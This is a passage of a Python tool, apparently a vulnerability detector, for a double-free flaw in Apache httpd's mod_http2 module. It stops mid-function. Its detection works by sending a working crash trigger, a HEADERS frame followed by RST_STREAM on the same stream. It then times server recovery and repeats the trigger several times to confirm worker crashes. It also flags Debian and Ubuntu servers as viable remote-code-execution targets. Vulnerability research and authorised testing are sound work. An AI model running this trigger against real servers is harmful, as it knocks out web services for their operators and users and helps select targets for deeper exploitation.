#!/usr/bin/env python3
"""
CVE-2026-23918 — Apache httpd mod_http2 Double-Free Detector
=============================================================
Affected : Apache httpd 2.4.66 / mod_http2 < 2.0.37
Fixed in : mod_http2 2.0.37 / httpd 2.4.67  (PR #69899, author: Stefan Eissing)

CVE discovered by:
  Bartlomiej Dmitruk  — co-founder, Striga.ai
  Stanislaw Strzalkowski — ISEC.pl

Detector script by:
  Alex Hdz  aka (alt3kx@protonmail.com) May France (c) 2026 
  https://github.com/alt3kx

References:
  https://www.cve.org/CVERecord?id=CVE-2026-23918
  https://httpd.apache.org/security/vulnerabilities_24.html
  https://bz.apache.org/bugzilla/show_bug.cgi?id=69899
  https://github.com/apache/httpd/blob/trunk/CHANGES

DISCLAIMER:
  This tool is provided for educational and authorized security research
  purposes ONLY. Use only against systems you own or have explicit written
  permission to test. The author assumes no liability for misuse or damage
  caused by this tool. Unauthorized use may violate local, state, or federal
  laws. Always obtain proper authorization before testing.

Root cause
----------
Client sends HEADERS + RST_STREAM(error_code != 0) on the SAME stream,
pipelined, before the h2_mplx multiplexer has registered the stream.

nghttp2 fires two callbacks in sequence on the c1 thread:
  on_frame_recv_cb   → h2_mplx_c1_client_rst → m_stream_cleanup
                          → APR_ARRAY_PUSH(m->spurge, stream)   ← push 1
  on_stream_close_cb → h2_mplx_c1_client_rst → m_stream_cleanup
                          → APR_ARRAY_PUSH(m->spurge, stream)   ← push 2 (SAME ptr)

c1_purge_streams then calls apr_pool_destroy twice on the same pointer.

Fix: add_for_purge() walks spurge before pushing; skips if already present.

Trigger  (deterministic, not a race)
--------------------------------------
  One TCP connection.  One sendall().  Two frames:
    HEADERS     stream=N   (any valid GET request)
    RST_STREAM  stream=N   error_code != 0   (CANCEL=8 works)

  Single sendall ensures both frames are in the server's TCP recv-buffer
  before nghttp2 processes either, so the stream can't be registered
  between the two callbacks.

Crash detection — what is and is NOT evidence of a crash
---------------------------------------------------------
  NOT evidence:
    • Trigger connection closed by server      ← normal RST handling
    • GOAWAY on trigger connection             ← normal graceful close
    • Fast (<150 ms) reconnect                ← just TLS handshake time

  IS evidence (all three must hold):
    • PING fails on a FRESH monitor connection ← worker process gone
    • Recovery takes > CRASH_RECOVERY_MIN_MS  ← MPM restarting child
    • Pattern repeats across N triggers        ← deterministic, not fluke
"""

import os, re, struct, socket, ssl, time, json, argparse, logging, sys, threading
import statistics as _stats
import statistics as _stats
from typing import Dict, List, Tuple, Optional, Set
from collections import defaultdict

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-7s  %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger(__name__)

FIXED_VERSION         = (2, 0, 37)   # mod_http2
FIXED_VERSION_STR     = "2.0.37"
FIXED_HTTPD_VERSION   = (2, 4, 67)   # Apache httpd full fix release
FIXED_HTTPD_STR       = "2.4.67"
CVSS_SCORE            = "8.8"
CVE_ID                = "CVE-2026-23918"
RCE_PLATFORMS         = ["debian", "ubuntu", "raspbian"]
                         # APR mmap allocator default on these distros
                         # + official Apache Docker image → RCE path viable

# A real ASAN abort + Apache MPM child restart takes 150–600 ms.
# Normal TLS reconnect on localhost is < 30 ms.
# We require recovery > this value to call a drop a crash.
CRASH_RECOVERY_MIN_MS = 150   # ms  — fallback (no baseline available)
CRASH_MULTIPLIER      = 1.3   # connect_ms/baseline_ms — lowered to catch
                               # fast-restart builds (ASAN vs plain)
                               # patched:           ratio ≈ 1.01
                               # vuln fast-restart: ratio ≈ 1.3-1.5
                               # vuln ASAN build:   ratio ≈ 2.0-4.0
CRASH_MIN_DELTA_MS    = 80    # ms above baseline that must ALSO be exceeded
                               # guards against jitter false-positives;
                               # typical network jitter < 30 ms even remote

# ─────────────────────────────────────────────────────────────────────────────
# HTTP/2 frame builders
# ─────────────────────────────────────────────────────────────────────────────
def _build(ftype: int, flags: int, sid: int, payload: bytes = b"") -> bytes:
    n = len(payload)
    return (struct.pack("!I", n)[1:]
            + struct.pack("!BB", ftype, flags)
            + struct.pack("!I", sid & 0x7FFFFFFF)
            + payload)

def f_headers(sid: int, block: bytes,
              end_stream: bool = False, end_headers: bool = True) -> bytes:
    flags = (0x1 if end_stream else 0) | (0x4 if end_headers else 0)
    return _build(0x1, flags, sid, block)

def f_rst(sid: int, error_code: int = 0x8) -> bytes:
    if error_code == 0:
        raise ValueError("RST_STREAM error_code=0 does NOT trigger CVE-2026-23918; "
                         "use any non-zero code (e.g. 0x8 CANCEL)")
    return _build(0x3, 0, sid, struct.pack("!I", error_code))

def f_settings(params: Optional[Dict[int, int]] = None, ack: bool = False) -> bytes:
    if ack:
        return _build(0x4, 0x1, 0)
    return _build(0x4, 0, 0,
                  b"".join(struct.pack("!HI", k, v)
                           for k, v in (params or {}).items()))

def f_ping(opaque: bytes = b"\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE",
           ack: bool = False) -> bytes:
    return _build(0x6, 0x1 if ack else 0, 0, opaque[:8].ljust(8, b"\x00"))

def f_goaway(last_sid: int, error: int = 0, debug: bytes = b"") -> bytes:
    return _build(0x7, 0, 0,
                  struct.pack("!II", last_sid & 0x7FFFFFFF, error) + debug)

# ─────────────────────────────────────────────────────────────────────────────
# HPACK encoder — literal without indexing, never Huffman
# ─────────────────────────────────────────────────────────────────────────────
def hpack_encode(hdrs: List[Tuple[str, str]]) -> bytes:
    out = b""
    for name, value in hdrs:
        n, v = name.encode(), value.encode()
        out += b"\x40" + bytes([len(n)]) + n + bytes([len(v)]) + v
    return out

def _req_block(host: str, sid: int, path: str = "/",
               scheme: str = "https") -> bytes:
    """Build HPACK request block.  scheme must match TLS state."""
    return hpack_encode([
        (":method",    "GET"),
        (":path",      path),
        (":scheme",    scheme),
        (":authority", host),
        ("user-agent", "h2-cve-2026-23918-probe/1.0"),
    ])

# RST error codes to cycle through — all non-zero, all trigger the bug
TRIGGER_ERROR_CODES = [0x8, 0x1, 0x7, 0x2]   # CANCEL, PROTOCOL_ERROR, REFUSED, INTERNAL

def build_trigger(sid: int, block: bytes, error_code: int = 0x8) -> bytes:
    """
    The two-frame CVE trigger concatenated into one bytes object.
    Caller must deliver this via a single sendall() call so both frames
    land in the server's TCP recv-buffer before nghttp2 processes either.
    """
    return f_headers(sid, block, end_stream=False) + f_rst(sid, error_code)

# ─────────────────────────────────────────────────────────────────────────────
# H2Connection
# ─────────────────────────────────────────────────────────────────────────────
CLIENT_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

class H2Connection:
    def __init__(self, host: str, port: int, tls: bool = True, timeout: int = 8):
        self.host, self.port, self.tls, self.timeout = host, port, tls, timeout
        self.sock: Optional[ssl.SSLSocket] = None
        self.connected = False

    def connect(self):
        raw = socket.create_connection((self.host, self.port), timeout=self.timeout)
        raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        if self.tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2"])
            raw = ctx.wrap_socket(raw, server_hostname=self.host)
            if raw.selected_alpn_protocol() != "h2":
                raw.close()
                raise RuntimeError("ALPN h2 not negotiated")
        self.sock = raw
        self.sock.sendall(CLIENT_PREFACE)
        self.sock.sendall(f_settings({0x3: 100, 0x4: 65535}))
        self._handshake()
        self.connected = True

    def _handshake(self):
        deadline, buf = time.time() + 3.0, b""
        while time.time() < deadline:
            try:
                self.sock.settimeout(0.4)
                c = self.sock.recv(4096)
                if not c:
                    break
                buf += c
                while len(buf) >= 9:
                    ln = struct.unpack("!I", b"\x00" + buf[:3])[0]
                    if len(buf) < 9 + ln:
                        break
                    ft, fl, buf = buf[3], buf[4], buf[9 + ln:]
                    if ft == 0x4 and not (fl & 0x1):
                        self.sock.sendall(f_settings(ack=True))
                        self.sock.settimeout(self.timeout)
                        return
            except socket.timeout:
                pass
        self.sock.settimeout(self.timeout)

    def send(self, data: bytes) -> bool:
        if not self.connected:
            return False
        try:
            self.sock.sendall(data)
            return True
        except OSError:
            self.connected = False
            return False

    def recv(self, n: int = 4096, timeout: float = 2.0) -> bytes:
        buf, deadline = b"", time.time() + timeout
        try:
            while len(buf) < n and time.time() < deadline:
                self.sock.settimeout(max(0.05, deadline - time.time()))
                c = self.sock.recv(n - len(buf))
                if not c:
                    break
                buf += c
        except OSError:
            self.connected = False
        finally:
            try:
                self.sock.settimeout(self.timeout)
            except OSError:
                pass
        return buf

    def close(self):
        self.connected = False
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

# ─────────────────────────────────────────────────────────────────────────────
# H2FrameReader
# ─────────────────────────────────────────────────────────────────────────────
_FTYPES = {0x0:"DATA", 0x1:"HEADERS", 0x3:"RST_STREAM", 0x4:"SETTINGS",
           0x6:"PING",  0x7:"GOAWAY",  0x8:"WINDOW_UPDATE"}

class H2FrameReader:
    def __init__(self, conn: H2Connection):
        self.conn, self._buf = conn, b""

    def read(self, timeout: float = 2.0) -> Optional[Dict]:
        deadline = time.time() + timeout
        while True:
            if len(self._buf) >= 9:
                ln = struct.unpack("!I", b"\x00" + self._buf[:3])[0]
                if len(self._buf) >= 9 + ln:
                    raw, self._buf = self._buf[:9 + ln], self._buf[9 + ln:]
                    ft = raw[3]
                    return {"type": ft, "name": _FTYPES.get(ft, f"0x{ft:02x}"),
                            "flags": raw[4],
                            "stream_id": struct.unpack("!I", raw[5:9])[0] & 0x7FFFFFFF,
                            "payload": raw[9:]}
            remaining = deadline - time.time()
            if remaining <= 0:
                return None
            chunk = self.conn.recv(4096, timeout=min(0.3, remaining))
            if not chunk:
                return None
            self._buf += chunk

    def goaway_fields(self, fr: Dict) -> Tuple[int, int, bytes]:
        p = fr.get("payload", b"")
        if len(p) < 8:
            return 0, 0, b""
        return (struct.unpack("!I", p[:4])[0] & 0x7FFFFFFF,
                struct.unpack("!I", p[4:8])[0], p[8:])

# ─────────────────────────────────────────────────────────────────────────────
# Version detection — handles -git / -dev / -alpha / -rcN suffixes
# ─────────────────────────────────────────────────────────────────────────────
_VER_RE = re.compile(
    r"mod_http2/(\d+)\.(\d+)\.(\d+)(?:[-.](?:git|dev|alpha|beta|rc\d*))?",
    re.IGNORECASE)
_VER_RE_B = re.compile(
    rb"(?:mod_http2/)?(\d+\.\d+\.\d+)(?:[-.](?:git|dev|alpha|beta|rc\d*))?",
    re.IGNORECASE)

def _parse_ver(s: str) -> Optional[Tuple[int, int, int]]:
    m = _VER_RE.search(s)
    return (int(m.group(1)), int(m.group(2)), int(m.group(3))) if m else None

def _parse_ver_b(data: bytes) -> Optional[str]:
    m = _VER_RE_B.search(data)
    return m.group(1).decode() if m else None

def _ver_verdict(ver: Tuple[int, int, int]) -> str:
    return "VULNERABLE" if ver < FIXED_VERSION else "PATCHED"

def probe_banner_h1(host: str, port: int, tls: bool,
                    timeout: int = 6) -> Optional[str]:
    """HTTP/1.1 request (no ALPN h2) — forces plain response headers."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall((
            f"GET / HTTP/1.1\r\nHost: {host}:{port}\r\n"
            "User-Agent: h2-cve-probe/1.0\r\nConnection: close\r\nAccept: */*\r\n\r\n"
        ).encode())
        resp, sock.timeout = b"", timeout
        while b"\r\n\r\n" not in resp:
            c = sock.recv(4096)
            if not c:
                break
            resp += c
        sock.close()
        for line in resp.split(b"\r\n"):
            if line.lower().startswith(b"server:"):
                return line.split(b":", 1)[1].strip().decode(errors="replace")
    except Exception as e:
        logger.debug(f"H1 banner: {e}")
    return None

def parse_httpd_version(server_hdr: str) -> Optional[Tuple[int,int,int]]:
    """Extract Apache/X.Y.Z from Server header."""
    m = re.search(r"Apache/(\d+)\.(\d+)\.(\d+)", server_hdr, re.I)
    return (int(m.group(1)), int(m.group(2)), int(m.group(3))) if m else None


def detect_rce_platform(server_hdr: str) -> Optional[str]:
    """
    Detect Debian/Ubuntu/Raspbian from Server header.
    These distros compile APR with the mmap allocator by default, enabling
    the RCE path via freed-VA reuse.  The official Apache Docker image also
    uses this APR configuration.
    """
    low = server_hdr.lower()
    for plat in RCE_PLATFORMS:
        if plat in low:
            return plat
    return None


def probe_banner_h2(host: str, port: int, tls: bool) -> Optional[str]:
    """Scan HPACK literals + GOAWAY debug data for mod_http2/X.Y.Z."""
    conn = H2Connection(host, port, tls)
    try:
        conn.connect()
        reader = H2FrameReader(conn)
        block  = _req_block(host, 1, "/", scheme="https" if tls else "http")
        conn.send(f_headers(1, block, end_stream=True))
        deadline = time.time() + 4.0
        while time.time() < deadline:
            fr = reader.read(timeout=deadline - time.time())
            if fr is None:
                break
            if fr["type"] == 0x1:
                v = _parse_ver_b(fr["payload"])
                if v:
                    return v
            if fr["type"] == 0x7:
                _, _, dbg = reader.goaway_fields(fr)
                v = _parse_ver_b(dbg) or _parse_ver_b(fr["payload"])
                if v:
                    return v
    except Exception as e:
        logger.debug(f"H2 banner: {e}")
    finally:
        conn.close()
    return None

# ─────────────────────────────────────────────────────────────────────────────
# Baseline statistics
# ─────────────────────────────────────────────────────────────────────────────
class BaselineStats:
    """
    Statistical characterisation of normal H2 connection time.

    Adaptive crash threshold — the MOST CONSERVATIVE of three estimates so
    that we never flag legitimate slowdowns as crashes:

      1. mean × CRASH_MULTIPLIER          ratio-based (default 1.3×)
      2. mean + N_SIGMA × stddev          sigma-based (default 4σ)
      3. mean + CRASH_MIN_DELTA_MS        absolute guard (default 80 ms)

    Using max() means ALL three must be satisfied by the observed delay.
    For a patched server with baseline=322 ms and stddev=3 ms:
      threshold ≈ max(419, 334, 402) = 419 ms
    A reconnect of 447 ms (vulnerable 8443) exceeds 419 ms → crash.
    A reconnect of 323 ms (patched 7443) does not → no crash.
    """

    N_SIGMA = 4.0   # σ multiplier for statistical threshold

    def __init__(self, samples: List[float]):
        if not samples:
            raise ValueError("No baseline samples")
        self.samples  = samples
        self.mean     = _stats.mean(samples)
        self.stddev   = _stats.stdev(samples) if len(samples) > 1 else 0.0
        self.median   = _stats.median(samples)
        s             = sorted(samples)
        self.p95      = s[min(int(0.95 * len(s)), len(s) - 1)]

    @property
    def threshold(self) -> float:
        return max(
            self.mean * CRASH_MULTIPLIER,
            self.mean + self.N_SIGMA * self.stddev,
            self.mean + CRASH_MIN_DELTA_MS,
        )

    def is_crash(self, connect_ms: float) -> bool:
        return connect_ms >= self.threshold

    @property
    def quality(self) -> str:
        """Network quality label based on jitter (σ)."""
        if self.stddev < 5:   return "excellent"
        if self.stddev < 20:  return "good"
        if self.stddev < 50:  return "fair"
        return "poor"

    @property
    def is_high_jitter(self) -> bool:
        """True if σ ≥ 50 ms — reduces crash detection confidence."""
        return self.stddev >= 50.0

    def summary(self) -> str:
        return (
            f"n={len(self.samples)}  "
            f"mean={self.mean:.0f}ms  σ={self.stddev:.1f}ms  "
            f"p95={self.p95:.0f}ms  "
            f"threshold={self.threshold:.0f}ms  "
            f"quality={self.quality}"
        )


def measure_baseline_stats(host: str, port: int, tls: bool,
                            n: int = 12) -> Optional["BaselineStats"]:
    """
    Collect n fresh-connection health-check samples and return statistics.
    Discards the first two samples (warm-up) and outliers > 3×median.
    """
    raw = []
    for i in range(n + 2):          # +2 warm-up
        ok, ms = health_check(host, port, tls, timeout=3.0)
        if ok:
            raw.append(ms)
        time.sleep(0.04)

    if len(raw) < 4:
        return None

    raw = raw[2:]                   # drop warm-up
    med = _stats.median(raw)
    clean = [x for x in raw if x <= med * 3.0]   # drop outliers
    if len(clean) < 3:
        return None

    return BaselineStats(clean)


# ─────────────────────────────────────────────────────────────────────────────
# PrecisionMonitor — persistent H2 connection for low-latency PING
#
# Why persistent?
#   Fresh connection: TCP + TLS + H2-SETTINGS + PING ≈ 300 ms (on ASAN Docker)
#   Established PING:                                ≈   2 ms
#
# The crash signal is an MPM restart delay of 100–500 ms.
# Against 300 ms noise floor the signal-to-noise ratio is poor.
# Against 2 ms noise floor it is overwhelming.
#
# After a trigger we PING on the established connection immediately:
#   • PING answers in ~2 ms  → the worker handling THIS connection is alive
#                               → no crash on this connection's worker
#   • PING times out / RST   → the worker died; measure recovery on fresh conn
#
# Note: in event/worker MPM multiple connections can share a process.
# The trigger might kill a DIFFERENT process than the one our monitor
# connection is on.  We therefore ALSO track fresh-connection time after
# every trigger — if it's consistently slow, workers are cycling.
# ─────────────────────────────────────────────────────────────────────────────
class PrecisionMonitor:
    KEEPALIVE_INTERVAL = 0.4    # seconds between background PINGs
    PING_TIMEOUT       = 0.5    # seconds to wait for PONG on established conn
    MAX_RTT_SAMPLES    = 30     # rolling window for RTT baseline on established conn

    def __init__(self, host: str, port: int, tls: bool):
        self.host, self.port, self.tls = host, port, tls
        self._conn:   Optional[H2Connection]  = None
        self._reader: Optional[H2FrameReader] = None
        self._lock    = threading.Lock()
        self._running = False
        self._ka_thread: Optional[threading.Thread] = None
        self._rtt_samples: List[float] = []   # RTT on ESTABLISHED connection
        self._last_rtt: Optional[float] = None

    # ── lifecycle ─────────────────────────────────────────────────────────
    def start(self) -> bool:
        if not self._connect():
            return False
        self._running = True
        self._ka_thread = threading.Thread(target=self._keepalive_loop,
                                           daemon=True)
        self._ka_thread.start()
        # Warm up a few RTT samples
        for _ in range(5):
            self._ping_once()
            time.sleep(0.03)
        return True

    def stop(self):
        self._running = False
        with self._lock:
            if self._conn:
                self._conn.close()
                self._conn = None

    # ── connection management ─────────────────────────────────────────────
    def _connect(self) -> bool:
        try:
            c = H2Connection(self.host, self.port, self.tls, timeout=6)
            c.connect()
            with self._lock:
                if self._conn:
                    self._conn.close()
                self._conn   = c
                self._reader = H2FrameReader(c)
            logger.debug("PrecisionMonitor: connected")
            return True
        except Exception as e:
            logger.debug(f"PrecisionMonitor: connect failed: {e}")
            return False

    def _keepalive_loop(self):
        while self._running:
            time.sleep(self.KEEPALIVE_INTERVAL)
            with self._lock:
                alive = self._conn and self._conn.connected
            if not alive:
                logger.debug("PrecisionMonitor: reconnecting")
                self._connect()

    # ── PING on the established connection ────────────────────────────────
    def _ping_once(self) -> Optional[float]:
        """
        Send one PING on the persistent connection.
        Returns RTT in ms, or None if the connection is dead.
        """
        with self._lock:
            if not self._conn or not self._conn.connected:
                return None
            opaque = os.urandom(8)
            t0 = time.perf_counter()
            if not self._conn.send(f_ping(opaque)):
                self._conn = None
                return None
            reader = self._reader

        # Wait for PONG outside the lock (non-blocking read)
        deadline = time.time() + self.PING_TIMEOUT
        while time.time() < deadline:
            fr = reader.read(timeout=min(0.05, deadline - time.time()))
            if fr is None:
                break
            if fr["type"] == 0x6 and (fr["flags"] & 0x1)                     and fr["payload"][:8] == opaque:
                rtt = (time.perf_counter() - t0) * 1000
                with self._lock:
                    self._rtt_samples.append(rtt)
                    if len(self._rtt_samples) > self.MAX_RTT_SAMPLES:
                        self._rtt_samples.pop(0)
                    self._last_rtt = rtt
                return rtt
            if fr["type"] == 0x7:       # server-initiated GOAWAY
                with self._lock:
                    self._conn = None
                return None

        # Timeout — treat connection as dead
        with self._lock:
            self._conn = None
        return None

    def ping_rtt_stats(self) -> Optional[BaselineStats]:
        """Baseline stats from established-connection PING samples."""
        with self._lock:
            s = list(self._rtt_samples)
        return BaselineStats(s) if len(s) >= 3 else None

    # ── post-trigger health check ─────────────────────────────────────────
    def check_after_trigger(self, wait_ms: float = 50.0,
                             conn_stats: Optional[BaselineStats] = None
                             ) -> Dict:
        """
        Called immediately after firing a trigger.

        Returns a dict:
          persistent_rtt_ms  — PING RTT on existing connection (None = dead)
          fresh_ok           — whether a fresh connection succeeded
          fresh_ms           — fresh connection time
          crashed            — crash verdict
          recovery_ms        — ms from first failure until fresh conn succeeds
        """
        time.sleep(wait_ms / 1000.0)

        result: Dict = {
            "persistent_rtt_ms": None,
            "fresh_ok":          False,
            "fresh_ms":          None,
            "crashed":           False,
            "recovery_ms":       None,
        }

        # ── Fast path: PING on established connection ─────────────────────
        rtt = self._ping_once()
        result["persistent_rtt_ms"] = rtt

        if rtt is not None:
            # Established connection is alive
            # Check if RTT is anomalously high (server under stress after crash)
            with self._lock:
                rtt_s = list(self._rtt_samples)
            if len(rtt_s) >= 5:
                rtt_stats = BaselineStats(rtt_s)
                if rtt >= rtt_stats.threshold:
                    logger.debug(f"Established RTT anomaly: {rtt:.1f}ms "
                                 f"(threshold={rtt_stats.threshold:.1f}ms)")
                    # Don't count as crash yet — the trigger hit a DIFFERENT worker
                    # We still check fresh connection below

        # ── Fresh connection time ─────────────────────────────────────────
        t0 = time.perf_counter()
        fresh_ok, fresh_ms = health_check(self.host, self.port, self.tls,
                                          timeout=2.0)
        result["fresh_ok"] = fresh_ok
        result["fresh_ms"] = fresh_ms

        # ── Crash verdict ─────────────────────────────────────────────────
        if rtt is None:
            # Persistent connection died — definite crash on this worker
            result["crashed"] = True
            # Recovery time: from loss of persistent PING to fresh conn success
            if fresh_ok:
                result["recovery_ms"] = round((time.perf_counter() - t0) * 1000, 1)
            else:
                # Still recovering — wait for it
                for _ in range(30):
                    time.sleep(0.1)
                    ok, ms = health_check(self.host, self.port, self.tls, timeout=1.0)
                    if ok:
                        result["recovery_ms"] = round(
                            (time.perf_counter() - t0) * 1000, 1)
                        break
        elif conn_stats and conn_stats.is_crash(fresh_ms or 0):
            # Persistent connection survived but fresh conn was very slow
            # → a DIFFERENT worker crashed and MPM is restarting it
            result["crashed"] = True
            result["recovery_ms"] = fresh_ms

        return result


# ─────────────────────────────────────────────────────────────────────────────
# Health check — always a FRESH connection, never reused
#
# Why fresh?  A reused connection can be closed by the server's idle-timeout
# or by a previous trigger's GOAWAY, making it appear dead when the server
# is actually fine.  A fresh connection removes that ambiguity entirely.
#
# What we measure:
#   connect_ms  — time to complete TLS + HTTP/2 handshake
#                 < 30 ms  → server is up, no crash
#                 150–600 ms → MPM is restarting a child (crash signature)
#   ping_ok     — did a PING ACK come back on the fresh connection
# ─────────────────────────────────────────────────────────────────────────────
# Number of PINGs per health-check call.  Minimum RTT is used for decisions
# so queuing jitter is eliminated; typical variation drops from ±20 ms to ±1 ms.
N_PINGS_PER_CHECK = 5

def health_check(host: str, port: int, tls: bool,
                 wait_before_ms: float = 0,
                 n_pings: int = N_PINGS_PER_CHECK,
                 timeout: float = 2.5) -> Tuple[bool, float]:
    """
    Precision health check — fresh connection, n_pings PINGs, return
    (ping_ok, total_ms) where total_ms = handshake + minimum PING RTT.

    Using minimum RTT eliminates OS scheduler jitter (±20 ms → ±1 ms).
    Even mid-restart the minimum is elevated because the first PING stalls
    until the new worker is ready, so crashes are still detected.

    ok = True only if ALL n_pings ACKs received.  Caller uses this to
    distinguish a live server (all ok) from a recovering one (some fail).
    """
    if wait_before_ms:
        time.sleep(wait_before_ms / 1000.0)

    # Use a single monotonic clock (perf_counter) throughout.
    # Never mix perf_counter with time.time() for deadline arithmetic.
    t_start      = time.perf_counter()
    t_deadline   = t_start + timeout
    conn         = H2Connection(host, port, tls, timeout=int(timeout) + 1)
    rtts: List[float] = []
    handshake_ms = 0.0

    try:
        conn.connect()
        handshake_ms = (time.perf_counter() - t_start) * 1000
        reader       = H2FrameReader(conn)

        for i in range(n_pings):
            remaining = t_deadline - time.perf_counter()
            if remaining < 0.05:          # not enough time for another PING
                break
            ping_window = min(1.0, remaining - 0.02)  # leave 20 ms margin
            opaque      = struct.pack("!d", time.perf_counter())[:8]  # unique
            t_ping      = time.perf_counter()
            if not conn.send(f_ping(opaque)):
                break

            got_ack = False
            ping_dl = time.perf_counter() + ping_window
            while time.perf_counter() < ping_dl:
                fr = reader.read(timeout=max(0.01,
                                             ping_dl - time.perf_counter()))
                if fr is None:
                    break
                if (fr["type"] == 0x6 and (fr["flags"] & 0x1)
                        and fr["payload"][:8] == opaque):
                    rtts.append((time.perf_counter() - t_ping) * 1000)
                    got_ack = True
                    break
                if fr["type"] == 0x7:
                    logger.debug("health_check: server GOAWAY mid-probe")
                    break
            if not got_ack:
                break
            time.sleep(0.003)   # brief inter-PING gap

    except Exception as e:
        logger.debug(f"health_check: {e}")
    finally:
        conn.close()

    total_ms = (time.perf_counter() - t_start) * 1000
    if rtts:
        # Primary measurement: handshake + min PING RTT
        best_ms = round(min(handshake_ms + min(rtts), total_ms), 1)
        return len(rtts) == n_pings, best_ms
    return False, round(total_ms, 1)


def _is_crash(ping_ok: bool, connect_ms: float,
              baseline: "Optional[BaselineStats]" = None,
              baseline_ms: float = 0.0) -> bool:
    """
    Unified crash decision.  Accepts either a BaselineStats object (preferred)
    or a plain float for backwards compatibility.

    With BaselineStats:  uses the adaptive threshold (max of ratio/sigma/delta).
    Without:             falls back to ratio + absolute delta checks.
    Fallback:            not ping_ok AND connect_ms >= CRASH_RECOVERY_MIN_MS.
    """
    if baseline is not None:
        return baseline.is_crash(connect_ms)
    bms = baseline_ms
    if bms > 0:
        ratio = connect_ms / bms
        delta = connect_ms - bms
        if ratio >= CRASH_MULTIPLIER and delta >= CRASH_MIN_DELTA_MS:
            return True
    if not ping_ok and connect_ms >= CRASH_RECOVERY_MIN_MS:
        return True
    return False

# ─────────────────────────────────────────────────────────────────────────────
# Baseline measurement — statistical model of normal connect+PING time
# ─────────────────────────────────────────────────────────────────────────────
def probe_baseline(host: str, port: int, tls: bool,
                   n: int = 15) -> Tuple[bool, Optional["BaselineStats"]]:
    """
    Collect n precise health-check measurements and return a BaselineStats
    object whose adaptive threshold auto-tunes to this specific server/network.

    n=15 gives a stable mean and σ estimate while completing in ~3 s on
    a 300 ms-baseline ASAN Docker target.

    Returns (server_is_alive, BaselineStats | None).
    """
    raw:     List[float] = []
    n_fail   = 0
    # Two warm-up probes let the server warm TLS session cache (discarded)
    for i in range(n + 2):
        # Accept partial ok: even if not all 5 PINGs came back, use the ms
        # value as long as at least the handshake + 1 PING succeeded.
        ok, ms = health_check(host, port, tls, timeout=3.5, n_pings=3)
        if ms > 0:
            raw.append(ms)
        else:
            n_fail += 1
        # Hard abort only if MOST early probes completely fail (server down)
        if i < 4 and n_fail > i:   # more failures than successes so far
            logger.debug(f"probe_baseline: too many early failures ({n_fail}/{i+1})")
            return False, None
        time.sleep(0.07)

    if len(raw) < 4:
        return False, None

    clean = raw[2:]               # discard warm-up
    med   = _stats.median(clean)
    # Remove extreme outliers (> 3× median) — OS scheduler hiccups
    clean = [x for x in clean if x <= med * 3.0]
    if len(clean) < 3:
        return False, None

    return True, BaselineStats(clean)


def confirm_crash(host: str, port: int, tls: bool,
                  baseline: "BaselineStats", n: int = 3) -> bool:
    """
    Confirm a suspected crash by re-triggering n times and measuring each.

    Why re-trigger instead of just probing?
      After crash + MPM restart (< 500 ms), subsequent health_check probes
      show NORMAL latency — the evidence is gone.  Re-triggering re-creates
      the double-free condition so each confirmation probe sees an elevated
      connect time.  This works for both fast (plain build) and slow (ASAN)
      restarts, and on both local and internet targets.

    Criterion: strict majority (> n/2) of re-triggers cause elevated latency.
    """
    hits     = 0
    _scheme  = "https" if tls else "http"
    _base_sid = 8001
    for i in range(n):
        time.sleep(0.5)   # let MPM restart before next trigger
        ec  = TRIGGER_ERROR_CODES[i % len(TRIGGER_ERROR_CODES)]
        sid = _base_sid + i * 2
        try:
            c = H2Connection(host, port, tls)
            c.connect()
            c.send(build_trigger(sid, _req_block(host, sid, scheme=_scheme), ec))
            time.sleep(0.04)
            c.close()
        except OSError:
            pass
        ok, ms = health_check(host, port, tls, timeout=3.0)
        logger.debug(f"confirm_crash {i+1}/{n}: {ms:.0f}ms "
                     f"(thr={baseline.threshold:.0f}ms)")
        if baseline.is_crash(ms):
            hits += 1
    return hits > n // 2


def probe_control(host: str, port: int, tls: bool,
                  baseline: "BaselineStats") -> Tuple[bool, float]:
    """
    Send a BENIGN request (HEADERS + END_STREAM, no RST) then measure
    fresh connect time.  Timing only — ping_ok is NOT used here because
    occasional PING timeouts on healthy servers cause false "slow" counts.

    Returns (timing_ok: bool, fresh_connect_ms: float).
    timing_ok = True when ms is within baseline (server not under load).
    """
    _scheme = "https" if tls else "http"
    try:
        c = H2Connection(host, port, tls, timeout=4)
        c.connect()
        c.send(f_headers(1, _req_block(host, 1, scheme=_scheme), end_stream=True))
        time.sleep(0.08)
        c.close()
    except Exception:
        pass
    # Use n_pings=1 — we care about connect+first-PING time, not stability
    _, ms = health_check(host, port, tls, n_pings=1, timeout=2.5)
    timing_ok = not baseline.is_crash(ms)
    return timing_ok, ms

# ─────────────────────────────────────────────────────────────────────────────
# Single trigger probe
# ─────────────────────────────────────────────────────────────────────────────
def probe_one(host: str, port: int, tls: bool,
              error_code: int, sid: int = 1,
              baseline: Optional["BaselineStats"] = None,
              baseline_ms: float = 0.0,
              monitor: Optional["PrecisionMonitor"] = None) -> Dict:
    """
    Fire the CVE trigger once.  Two-signal crash detection:

    Signal A — PrecisionMonitor (fast, ~2 ms RTT on established connection):
      PING on the persistent monitor connection immediately after trigger.
      If RTT goes None → the worker serving THAT connection crashed.

    Signal B — fresh connection (slower, ~300 ms; eliminates single-worker bias):
      n_pings=5 health check, min RTT used for decision.
      If min RTT ≥ baseline.threshold → a DIFFERENT worker crashed + restarted.

    Both signals checked; either alone triggers confirmation step.
    """
    _scheme = "https" if tls else "http"
    result: Dict = {
        "error_code":           error_code,
        "trigger_conn_closed":  False,
        "goaway_on_trigger":    False,
        "goaway_error_code":    None,
        "monitor_rtt_ms":       None,   # Signal A: established PING RTT
        "ping_ok":              False,
        "connect_ms":           None,   # Signal B: fresh connection time
        "crashed":              False,
        "confirmed":            False,  # True = confirmation probes also fired
    }

    # ── Fire the trigger ──────────────────────────────────────────────────
    tconn = H2Connection(host, port, tls)
    try:
        tconn.connect()
